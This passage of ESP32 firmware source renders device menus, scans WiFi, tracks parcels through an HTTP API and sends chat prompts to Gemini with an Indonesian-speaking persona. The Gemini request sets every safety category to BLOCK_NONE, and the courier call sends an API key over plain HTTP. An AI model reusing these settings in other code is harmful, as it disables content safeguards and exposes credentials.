  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ MAIN MENU (REALISTIC B&W + PARTICLES) ============
void updateParticles() {
  if (!particlesInit) {
    for (int i = 0; i < NUM_PARTICLES; i++) {
      particles[i].x = random(0, SCREEN_WIDTH);
      particles[i].y = random(0, SCREEN_HEIGHT);
      particles[i].speed = random(10, 50) / 10.0f;
      particles[i].size = random(1, 3);
    }
    particlesInit = true;
  }

  for (int i = 0; i < NUM_PARTICLES; i++) {
    particles[i].x -= particles[i].speed;
    if (particles[i].x < 0) {
      particles[i].x = SCREEN_WIDTH;
      particles[i].y = random(0, SCREEN_HEIGHT);
    }
  }
}

void showMainMenu(int x_offset) {
  updateParticles();
  canvas.fillScreen(COLOR_BG);

  // Draw Particles (Background)
  for (int i = 0; i < NUM_PARTICLES; i++) {
    // Dim stars
    uint16_t color = (particles[i].size > 1) ? 0x8410 : 0x4208; // Dark Gray
    canvas.fillCircle(particles[i].x, particles[i].y, particles[i].size, color);
  }

  // Scanline Effect (Horizontal lines)
  for (int y = 0; y < SCREEN_HEIGHT; y += 4) {
    canvas.drawFastHLine(0, y, SCREEN_WIDTH, 0x18E3); // Very subtle gray line
  }

  drawStatusBar();
  
  const char* items[] = {"AI CHAT", "WIFI MGR", "ESP-NOW", "COURIER", "SYSTEM", "V-PET", "HACKER", "FILES", "GAME HUB", "ABOUT", "SONAR"};
  int numItems = 11;
  
  int centerX = SCREEN_WIDTH / 2;
  int centerY = SCREEN_HEIGHT / 2 + 5;
  int iconSpacing = 70;

  for (int i = 0; i < numItems; i++) {
    float offset = (i - menuScrollCurrent);
    int x = centerX + (offset * iconSpacing);
    int y = centerY;
    
    float dist = abs(offset);
    float scale = 1.0f - min(dist * 0.5f, 0.7f); // Sharper falloff
    if (scale < 0.1f) continue;

    int boxSize = 48 * scale;

    // Icon Logic
    if (abs(offset) < 0.5f) {
        // Active: "Glow" effect using concentric rects + Inverted Box
        // Simulate glow with dithering or just multiple lines
        for(int k=1; k<4; k++) {
           canvas.drawRoundRect(x - 24 - k, y - 24 - k, 48 + 2*k, 48 + 2*k, 6, 0x4208); // Dark gray glow
        }

        // Main Box
        canvas.fillRoundRect(x - 24, y - 24, 48, 48, 6, COLOR_PRIMARY); // White box
        canvas.drawBitmap(x - 16, y - 16, menuIcons[i], 32, 32, COLOR_BG); // Black Icon

        // Label with background for readability
        canvas.setTextSize(1);
        int labelW = strlen(items[i]) * 6;
        int labelX = centerX - labelW/2;
        int labelY = SCREEN_HEIGHT - 25;

        canvas.fillRect(labelX - 4, labelY - 2, labelW + 8, 12, COLOR_BG);
        canvas.drawRect(labelX - 4, labelY - 2, labelW + 8, 12, COLOR_PRIMARY);
        canvas.setTextColor(COLOR_PRIMARY);
        canvas.setCursor(labelX, labelY);
        canvas.print(items[i]);
    } else {
        // Inactive: Just Outline and Dim Icon
        canvas.drawRoundRect(x - 24, y - 24, 48, 48, 6, COLOR_DIM);
        canvas.drawBitmap(x - 16, y - 16, menuIcons[i], 32, 32, COLOR_DIM);
    }
  }
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ AI MODE SELECTION SCREEN ============
void showAIModeSelection(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  canvas.drawFastHLine(0, 13, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(10, 2);
  canvas.print("SELECT AI MODE");
  canvas.drawFastHLine(0, 25, SCREEN_WIDTH, COLOR_BORDER);
  
  const char* modes[] = {"SUBARU AWA", "STANDARD AI"};
  const char* descriptions[] = {
    "Personal, Memory, Friendly",
    "Helpful, Informative, Pro"
  };
  
  int itemHeight = 50;
  int startY = 40;
  
  for (int i = 0; i < 2; i++) {
    int y = startY + (i * itemHeight);
    
    if (i == (currentAIMode == MODE_SUBARU ? 0 : 1)) {
      canvas.fillRect(5, y, SCREEN_WIDTH - 10, itemHeight - 5, COLOR_PRIMARY);
      canvas.setTextColor(COLOR_BG);
    } else {
      canvas.drawRect(5, y, SCREEN_WIDTH - 10, itemHeight - 5, COLOR_BORDER);
      canvas.setTextColor(COLOR_PRIMARY);
    }
    
    canvas.setTextSize(2);
    int titleW = strlen(modes[i]) * 12;
    canvas.setCursor((SCREEN_WIDTH - titleW) / 2, y + 8);
    canvas.print(modes[i]);
    
    canvas.setTextSize(1);
    int descW = strlen(descriptions[i]) * 6;
    canvas.setCursor((SCREEN_WIDTH - descW) / 2, y + 28);
    canvas.print(descriptions[i]);
  }
  
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("UP/DOWN=Select | SELECT=OK | L+R=Back");
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ WIFI MENU ============
void showWiFiMenu(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_wifi, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("WiFi Manager");

  // Status Panel
  canvas.fillRoundRect(10, 40, SCREEN_WIDTH - 20, 45, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, 40, SCREEN_WIDTH - 20, 45, 8, COLOR_BORDER);
  canvas.setTextSize(1);
  canvas.setCursor(22, 50);
  canvas.setTextColor(COLOR_DIM);
  canvas.print("STATUS");

  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(22, 68);
  if (WiFi.status() == WL_CONNECTED) {
    String ssid = WiFi.SSID();
    if (ssid.length() > 25) ssid = ssid.substring(0, 25) + "...";
    canvas.print(ssid);
    canvas.setCursor(SCREEN_WIDTH - 80, 68);
    canvas.print("RSSI: ");
    canvas.print(cachedRSSI);
    canvas.print("dBm");
  } else {
    canvas.setTextColor(COLOR_WARN);
    canvas.print("Not Connected");
  }

  // Menu Items
  const char* menuItems[] = {"Scan Networks", "Forget Network", "Back"};
  drawScrollableMenu(menuItems, 3, 95, 25, 5);
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ WIFI SCAN ============
void displayWiFiNetworks(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  canvas.drawFastHLine(0, 13, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(10, 2);
  canvas.print("NETWORKS (");
  canvas.print(networkCount);
  canvas.print(")");
  canvas.drawFastHLine(0, 25, SCREEN_WIDTH, COLOR_BORDER);
  
  if (networkCount == 0) {
    canvas.setTextColor(COLOR_TEXT);
    canvas.setTextSize(2);
    canvas.setCursor(60, 80);
    canvas.print("No networks");
  } else {
    int startIdx = wifiPage * wifiPerPage;
    int endIdx = min(networkCount, startIdx + wifiPerPage);
    int itemHeight = 22;
    int startY = 32;
    
    for (int i = startIdx; i < endIdx; i++) {
      int y = startY + ((i - startIdx) * itemHeight);
      
      if (i == selectedNetwork) {
        canvas.fillRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_PRIMARY); // White
        canvas.setTextColor(COLOR_BG);
      } else {
        canvas.drawRect(5, y, SCREEN_WIDTH - 10, itemHeight - 2, COLOR_BORDER);
        canvas.setTextColor(COLOR_TEXT);
      }
      
      canvas.setTextSize(1);
      canvas.setCursor(10, y + 7);
      
      String displaySSID = networks[i].ssid;
      if (displaySSID.length() > 22) {
        displaySSID = displaySSID.substring(0, 22) + "..";
      }
      canvas.print(displaySSID);
      
      if (networks[i].encrypted) {
        canvas.setCursor(SCREEN_WIDTH - 45, y + 7);
        // Red Lock if encrypted
        if (i != selectedNetwork) canvas.setTextColor(0xF800); // Red
        canvas.print("L");
      }
      
      int bars = map(networks[i].rssi, -100, -50, 1, 4);
      bars = constrain(bars, 1, 4);

      // Color code signal strength (Green -> Yellow -> Red)
      uint16_t signalColor = 0xF800; // Red
      if (bars > 3) signalColor = 0x07E0; // Green
      else if (bars > 2) signalColor = 0xFFE0; // Yellow

      if (i == selectedNetwork) signalColor = COLOR_BG; // Invert on selection

      int barX = SCREEN_WIDTH - 30;
      for (int b = 0; b < 4; b++) {
        int h = (b + 1) * 2;
        if (b < bars) {
          canvas.fillRect(barX + (b * 4), y + 13 - h, 2, h, signalColor);
        } else {
          canvas.drawRect(barX + (b * 4), y + 13 - h, 2, h, COLOR_DIM);
        }
      }
    }
    
    if (networkCount > wifiPerPage) {
      canvas.setTextColor(COLOR_DIM);
      canvas.setTextSize(1);
      canvas.setCursor(SCREEN_WIDTH / 2 - 20, SCREEN_HEIGHT - 10);
      canvas.print("Page ");
      canvas.print(wifiPage + 1);
      canvas.print("/");
      canvas.print((networkCount + wifiPerPage - 1) / wifiPerPage);
    }
  }
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ KEYBOARD ============
const char* getCurrentKey() {
  if (keyboardContext == CONTEXT_ESPNOW_ADD_MAC) {
    return keyboardMac[cursorY][cursorX];
  }

  if (currentKeyboardMode == MODE_LOWER) {
    return keyboardLower[cursorY][cursorX];
  } else if (currentKeyboardMode == MODE_UPPER) {
    return keyboardUpper[cursorY][cursorX];
  } else {
    return keyboardNumbers[cursorY][cursorX];
  }
}

void toggleKeyboardMode() {
  if (keyboardContext == CONTEXT_ESPNOW_ADD_MAC) return; // No mode switching for MAC keyboard

  if (currentKeyboardMode == MODE_LOWER) {
    currentKeyboardMode = MODE_UPPER;
  } else if (currentKeyboardMode == MODE_UPPER) {
    currentKeyboardMode = MODE_NUMBERS;
  } else {
    currentKeyboardMode = MODE_LOWER;
  }
}

void drawKeyboard(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(110, 2);
  if (keyboardContext == CONTEXT_CHAT) {
    canvas.print("[");
    canvas.print(currentAIMode == MODE_SUBARU ? "SUBARU" : "STANDARD");
    canvas.print("]");
  } else if (keyboardContext == CONTEXT_ESPNOW_CHAT) {
    canvas.print("[ESP-NOW]");
  } else if (keyboardContext == CONTEXT_ESPNOW_NICKNAME) {
    canvas.print("[NICKNAME]");
  } else if (keyboardContext == CONTEXT_ESPNOW_ADD_MAC) {
    canvas.print("[MAC ADDR]");
  }
  
  canvas.drawRect(5, 18, SCREEN_WIDTH - 10, 24, COLOR_BORDER);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(10, 23);
  
  String displayText = "";
  if (keyboardContext == CONTEXT_WIFI_PASSWORD) {
     for(unsigned int i=0; i<passwordInput.length(); i++) displayText += "*";
  } else {
     displayText = userInput;
  }
  
  if (displayText.length() > 25) {
      displayText = displayText.substring(displayText.length() - 25);
  }
  canvas.print(displayText);
  
  int startY = 50;
  int keyW = 28;
  int keyH = 28;
  int gapX = 3;
  int gapY = 3;
  
  for (int r = 0; r < 3; r++) {
    for (int c = 0; c < 10; c++) {
      int x = 7 + c * (keyW + gapX);
      int y = startY + r * (keyH + gapY);
      
      const char* keyLabel;
      if (keyboardContext == CONTEXT_ESPNOW_ADD_MAC) {
         keyLabel = keyboardMac[r][c];
      } else {
        if (currentKeyboardMode == MODE_LOWER) {
           keyLabel = keyboardLower[r][c];
        } else if (currentKeyboardMode == MODE_UPPER) {
           keyLabel = keyboardUpper[r][c];
        } else {
           keyLabel = keyboardNumbers[r][c];
        }
      }
      
      if (r == cursorY && c == cursorX) {
        canvas.fillRect(x, y, keyW, keyH, COLOR_PRIMARY);
        canvas.setTextColor(COLOR_BG);
      } else {
        canvas.drawRect(x, y, keyW, keyH, COLOR_BORDER);
        canvas.setTextColor(COLOR_TEXT);
      }
      
      canvas.setTextSize(2);
      int tX = x + 8;
      if(strlen(keyLabel) > 1) tX = x + 4;
      
      canvas.setCursor(tX, y + 7);
      canvas.print(keyLabel);
    }
  }
  
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 10);
  canvas.print(currentKeyboardMode == MODE_LOWER ? "abc" : (currentKeyboardMode == MODE_UPPER ? "ABC" : "123"));
  
  canvas.setCursor(SCREEN_WIDTH - 80, SCREEN_HEIGHT - 10);
  canvas.print("L+R = Back");
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ CHAT RESPONSE ============
void displayResponse() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  canvas.fillRect(0, 15, SCREEN_WIDTH, 25, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  
  if (currentAIMode == MODE_SUBARU) {
    canvas.setCursor(90, 20);
    canvas.print("SUBARU");
  } else {
    canvas.setCursor(75, 20);
    canvas.print("STANDARD AI");
  }
  
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_TEXT);
  int y = 48 - scrollOffset;
  int lineHeight = 10;
  String word = "";
  int x = 5;
  for (unsigned int i = 0; i < aiResponse.length(); i++) {
    char c = aiResponse.charAt(i);
    if (c == ' ' || c == '\n' || i == aiResponse.length() - 1) {
      if (i == aiResponse.length() - 1 && c != ' ' && c != '\n') {
        word += c;
      }
      int wordWidth = word.length() * 6;
      if (x + wordWidth > SCREEN_WIDTH - 10) {
        y += lineHeight;
        x = 5;
      }
      if (y >= 40 && y < SCREEN_HEIGHT - 5) {
        canvas.setCursor(x, y);
        canvas.print(word);
      }
      x += wordWidth + 6;
      word = "";
      if (c == '\n') {
        y += lineHeight;
        x = 5;
      }
    } else {
      word += c;
    }
  }
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ LOADING ANIMATION ============
void showLoadingAnimation(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(80, 70);
  canvas.print("Thinking...");
  int cx = SCREEN_WIDTH / 2;
  int cy = SCREEN_HEIGHT / 2 + 20;
  int r = 20;
  for (int i = 0; i < 8; i++) {
    float angle = (loadingFrame + i) * (2 * PI / 8);
    int x = cx + cos(angle) * r;
    int y = cy + sin(angle) * r;
    if (i == 0) {
      canvas.fillCircle(x, y, 4, COLOR_ACCENT);
    } else {
      canvas.drawCircle(x, y, 2, COLOR_DIM);
    }
  }
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ SYSTEM INFO ============
void showSystemPerf(int x_offset) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_system, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("System Info");

  int y = 35;
  canvas.setTextSize(1);

  // Performance Panel
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 40, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 40, 8, COLOR_BORDER);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(20, y + 5);
  canvas.print("PERFORMANCE");
  canvas.setTextColor(COLOR_TEXT);
  canvas.setCursor(20, y + 22);
  canvas.print("FPS: " + String(perfFPS) + " | LPS: " + String(perfLPS) + " | CPU: " + String(temperatureRead(), 1) + "C");

  y += 45;

  // Memory Panel
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 55, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 55, 8, COLOR_BORDER);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(20, y + 5);
  canvas.print("MEMORY & STORAGE");
  canvas.setTextColor(COLOR_TEXT);

  canvas.setCursor(20, y + 20);
  canvas.print("RAM Free: " + String(ESP.getFreeHeap() / 1024) + " KB");

  if (psramFound()) {
    canvas.setCursor(20, y + 32);
    canvas.print("PSRAM Free: " + String(ESP.getFreePsram() / 1024) + " KB");
  }

  if (sdCardMounted) {
    canvas.setCursor(20, y + 44);
    canvas.print("SD Card: " + String((uint32_t)(SD.usedBytes() / (1024*1024))) + "/" + String((uint32_t)(SD.cardSize() / (1024*1024))) + " MB");
  } else {
    canvas.setCursor(20, y + 44);
    canvas.print("SD Card: Not mounted");
  }

  // Footer
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("SELECT = Clear Chat History | L+R = Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

// ============ COURIER TRACKER ============
void drawCourierTool() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_courier, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("Courier Tracker");

  int y = 40;

  // Resi Info
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 30, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 30, 8, COLOR_BORDER);
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(20, y + 5);
  canvas.print("RESI");
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(20, y + 17);
  String temp_kurir = bb_kurir;
  temp_kurir.toUpperCase();
  canvas.print(temp_kurir + " - " + bb_resi);

  y += 35;

  // Status
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 30, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 30, 8, COLOR_BORDER);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(20, y + 5);
  canvas.print("STATUS");

  if (isTracking) {
      canvas.setTextColor(0xFFE0); // Yellow
      if ((millis() / 200) % 2 == 0) courierStatus = "TRACKING...";
      else courierStatus = "TRACKING. .";
  }

  if (courierStatus.indexOf("DELIVERED") != -1) canvas.setTextColor(COLOR_SUCCESS);
  else if (courierStatus.indexOf("ERR") != -1) canvas.setTextColor(COLOR_ERROR);
  else if (isTracking) canvas.setTextColor(0xFFE0);
  else canvas.setTextColor(COLOR_PRIMARY);

  canvas.setCursor(20, y + 17);
  canvas.print(courierStatus);

  y += 35;

  // Details
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 42, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 42, 8, COLOR_BORDER);
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(20, y + 5);
  canvas.print("DETAILS");
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(20, y + 17);
  canvas.print("Loc: " + courierLastLoc.substring(0, 35));
  canvas.setCursor(20, y + 29);
  canvas.print("Date: " + courierDate);

  // Footer
  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("SELECT = Track Again | L+R = Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void checkResiReal() {
  if (WiFi.status() != WL_CONNECTED) {
    courierStatus = "NO WIFI";
    return;
  }
  isTracking = true;
  courierStatus = "FETCHING...";
  drawCourierTool();
  WiFiClient client;
  HTTPClient http;
  String url = "http://api.binderbyte.com/v1/track?api_key=" + bb_apiKey + "&courier=" + bb_kurir + "&awb=" + bb_resi;
  http.begin(client, url);
  int httpCode = http.GET();
  if (httpCode == 200) {
    String payload = http.getString();
    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, payload);
    if (!error) {
      JsonObject data = doc["data"];
      const char* st = data["summary"]["status"];
      if (st) courierStatus = String(st);
      else courierStatus = "NOT FOUND";
      JsonArray history = data["history"];
      if (history.size() > 0) {
        const char* loc = history[0]["location"];
        if (loc) courierLastLoc = String(loc);
        else courierLastLoc = "TRANSIT";
        const char* date = history[0]["date"];
        if (date) courierDate = String(date);
      }
    } else {
      courierStatus = "JSON ERR";
    }
  } else {
    courierStatus = "API ERR: " + String(httpCode);
  }
  http.end();
  isTracking = false;
}

// ============ WIFI FUNCTIONS ============
void scanWiFiNetworks(bool switchToScanState) {
  showProgressBar("Scanning", 0);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  showProgressBar("Scanning", 30);
  int n = WiFi.scanNetworks(false, false, false, 300);
  networkCount = min(n, 20);
  showProgressBar("Processing", 60);
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].channel = WiFi.channel(i);
  }
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = i + 1; j < networkCount; j++) {
      if (networks[j].rssi > networks[i].rssi) {
        WiFiNetwork temp = networks[i];
        networks[i] = networks[j];
        networks[j] = temp;
      }
    }
  }
  showProgressBar("Complete", 100);
  delay(500);
  selectedNetwork = 0;
  wifiPage = 0;
  menuSelection = 0;
  if (switchToScanState) {
    changeState(STATE_WIFI_SCAN);
  }
}

void connectToWiFi(String ssid, String password) {
  showProgressBar("Connecting", 0);
  WiFi.begin(ssid.c_str(), password.c_str());
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    attempts++;
    showProgressBar("Connecting", attempts * 5);
  }
  if (WiFi.status() == WL_CONNECTED) {
    savePreferenceString("ssid", ssid);
    savePreferenceString("password", password);
    showStatus("Connected!", 1500);
    configTime(25200, 0, "pool.ntp.org", "time.nist.gov");
    changeState(STATE_MAIN_MENU);
  } else {
    showStatus("Failed!", 1500);
    changeState(STATE_WIFI_MENU);
  }
}

void forgetNetwork() {
  WiFi.disconnect(true, true);
  savePreferenceString("ssid", "");
  savePreferenceString("password", "");
  showStatus("Network forgotten", 1500);
  changeState(STATE_WIFI_MENU);
}

void drawSystemMenu() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_system, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("System Settings");

  const char* items[] = {"Device Info", "Security", "Back"};
  drawScrollableMenu(items, 3, 45, 30, 5);

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawPinKeyboard() {
  int keyW = 60;
  int keyH = 25;
  int gapX = 5;
  int gapY = 4;
  int startX = (SCREEN_WIDTH - (3 * keyW + 2 * gapX)) / 2;
  int startY = 55;

  for (int r = 0; r < 4; r++) {
    for (int c = 0; c < 3; c++) {
      int x = startX + c * (keyW + gapX);
      int y = startY + r * (keyH + gapY);
      if (r == cursorY && c == cursorX) {
        canvas.fillRoundRect(x, y, keyW, keyH, 5, COLOR_PRIMARY);
        canvas.setTextColor(COLOR_BG);
      } else {
        canvas.drawRoundRect(x, y, keyW, keyH, 5, COLOR_BORDER);
        canvas.setTextColor(COLOR_TEXT);
      }
      canvas.setTextSize(2);
      const char* label = keyboardPin[r][c];
      int labelW = strlen(label) * 12;
      canvas.setCursor(x + (keyW - labelW) / 2, y + 8);
      canvas.print(label);
    }
  }
}

void drawPinLock(bool isChanging) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  canvas.setCursor(isChanging ? 70 : 100, 10);
  canvas.print(isChanging ? "Enter New PIN" : "Enter PIN");

  // Draw PIN input dots
  int dotStartX = (SCREEN_WIDTH - (4 * 20 - 5)) / 2;
  for (int i = 0; i < 4; i++) {
    if (i < pinInput.length()) {
      canvas.fillCircle(dotStartX + i * 20, 45, 5, COLOR_PRIMARY);
    } else {
      canvas.drawCircle(dotStartX + i * 20, 45, 5, COLOR_DIM);
    }
  }

  drawPinKeyboard();
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void sendToGemini() {
  currentState = STATE_LOADING;
  loadingFrame = 0;
  
  for (int i = 0; i < 5; i++) {
    showLoadingAnimation(0);
    delay(100);
    loadingFrame++;
  }
  
  if (WiFi.status() != WL_CONNECTED) {
    ledError();
    if (currentAIMode == MODE_SUBARU) {
      aiResponse = "Waduh, WiFi-nya nggak konek nih! 😅 Coba sambungin dulu ya~";
    } else {
      aiResponse = "Error: WiFi not connected. Please connect to a network first.";
    }
    currentState = STATE_CHAT_RESPONSE;
    scrollOffset = 0;
    return;
  }
  
  const char* currentApiKey = geminiApiKey1;
  HTTPClient http;
  String url = String(geminiEndpoint) + "?key=" + currentApiKey;
  http.begin(url);
  http.addHeader("Content-Type", "application/json");
  http.setTimeout(30000);
  
  String enhancedPrompt = buildEnhancedPrompt(userInput);
  
  String escapedInput = enhancedPrompt;
  escapedInput.replace("\\", "\\\\");
  escapedInput.replace("\"", "\\\"");
  escapedInput.replace("\n", "\\n");
  escapedInput.replace("\r", "");
  escapedInput.replace("\t", "\\t");
  escapedInput.replace("\b", "\\b");
  escapedInput.replace("\f", "\\f");
  
  String jsonPayload = "{\"contents\":[{\"parts\":[{\"text\":\"" + escapedInput + "\"}]}],";
  jsonPayload += "\"generationConfig\":{";
  
  if (currentAIMode == MODE_SUBARU) {
    jsonPayload += "\"temperature\":0.9,";
    jsonPayload += "\"topP\":0.95,";
    jsonPayload += "\"topK\":40,";
    jsonPayload += "\"maxOutputTokens\":1000";
  } else {
    jsonPayload += "\"temperature\":0.7,";
    jsonPayload += "\"topP\":0.9,";
    jsonPayload += "\"topK\":40,";
    jsonPayload += "\"maxOutputTokens\":800";
  }
  
  jsonPayload += "},";
  jsonPayload += "\"safetySettings\":[";
  jsonPayload += "{\"category\":\"HARM_CATEGORY_HARASSMENT\",\"threshold\":\"BLOCK_NONE\"},";
  jsonPayload += "{\"category\":\"HARM_CATEGORY_HATE_SPEECH\",\"threshold\":\"BLOCK_NONE\"},";
  jsonPayload += "{\"category\":\"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\"threshold\":\"BLOCK_NONE\"},";
  jsonPayload += "{\"category\":\"HARM_CATEGORY_DANGEROUS_CONTENT\",\"threshold\":\"BLOCK_NONE\"}";
  jsonPayload += "]}";
  
  int httpResponseCode = http.POST(jsonPayload);
  
  if (httpResponseCode == 200) {
    String response = http.getString();
    JsonDocument responseDoc;
    DeserializationError error = deserializeJson(responseDoc, response);
    
    if (!error && !responseDoc["candidates"].isNull()) {
      JsonArray candidates = responseDoc["candidates"];
      if (candidates.size() > 0) {
        JsonObject content = candidates[0]["content"];
        JsonArray parts = content["parts"];
        if (parts.size() > 0) {
          aiResponse = parts[0]["text"].as<String>();
          aiResponse.trim();
          
          if (currentAIMode == MODE_SUBARU) {
            appendChatToSD(userInput, aiResponse);
          }
          
          ledSuccess();
          triggerNeoPixelEffect(pixels.Color(0, 255, 100), 1500);
        } else {
          aiResponse = currentAIMode == MODE_SUBARU ? 
            "Hmm, aku bingung nih... Coba tanya lagi ya? 🤔" :
            "I couldn't generate a response. Please try again.";
          ledError();
        }
      } else {
        aiResponse = currentAIMode == MODE_SUBARU ?
          "Wah, kayaknya ada yang error di sistemku deh... 😅" :
          "Error: Unable to generate response.";
        ledError();
      }
    } else {
      ledError();
      aiResponse = currentAIMode == MODE_SUBARU ?
        "Aduh, aku lagi error parse response-nya nih... Maaf ya! 🙏" :
        "Error: Failed to parse API response.";
    }
  } else if (httpResponseCode == 429) {
    ledError();
    aiResponse = currentAIMode == MODE_SUBARU ?
      "Wah, aku lagi kebanyakan request nih... Tunggu sebentar ya! ⏳" :
      "Error 429: Too many requests. Please wait.";
    triggerNeoPixelEffect(pixels.Color(255, 165, 0), 1000);
  } else if (httpResponseCode == 401) {
    ledError();
    aiResponse = currentAIMode == MODE_SUBARU ?
      "API key-nya kayaknya bermasalah deh... Cek konfigurasi! 🔑" :
      "Error 401: Invalid API key.";
    triggerNeoPixelEffect(pixels.Color(255, 0, 0), 1000);
  } else {
    ledError();
    aiResponse = currentAIMode == MODE_SUBARU ?
      "Hmm, koneksi ke server-ku error nih (Error: " + String(httpResponseCode) + ") 😔" :
      "HTTP Error: " + String(httpResponseCode);
    triggerNeoPixelEffect(pixels.Color(255, 0, 0), 1000);
  }
  
  http.end();
  currentState = STATE_CHAT_RESPONSE;
  scrollOffset = 0;
}

